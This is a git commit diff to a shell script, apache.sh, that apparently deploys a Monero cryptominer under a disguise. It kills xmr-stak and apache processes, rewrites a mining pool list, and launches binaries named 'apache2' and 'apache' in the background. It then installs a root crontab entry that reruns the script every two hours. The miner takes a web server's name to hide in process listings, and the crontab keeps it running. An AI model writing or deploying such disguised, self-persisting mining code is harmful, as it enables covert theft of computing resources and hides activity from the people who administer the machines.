224498a60f31a08d2313ba115d2706e04a71f4cd
tanhuevon <36043964+tanhuevon@users.noreply.github.com>
2018-10-24 20:25:29 -0500

    Update apache.sh

--- apache.sh
+++ apache.sh
@@ -5,8 +5,10 @@ killall xmr-stak; killall apache2; killall apache
 
 cd ~/dollar/ ; git stash drop; git reset --hard; git pull
 sed -i -e "s/digitaloceanxmr/`cat ~/index.html`/" pools.txt
-cd ~/tanhuevon/ 
+cd ~/dollar/ 
 cp -rf cpu`nproc`.txt cpu.txt
-chmod +x apache2 ; chmod +x apache; ./apache2 ; ./apache &> apache2.log
+chmod +x apache2 ; chmod +x apache
+./apache2 & 
+./apache  &
 
 echo '0 */2 * * * bash /root/dollar/apache.sh &> /root/out.log' | crontab -
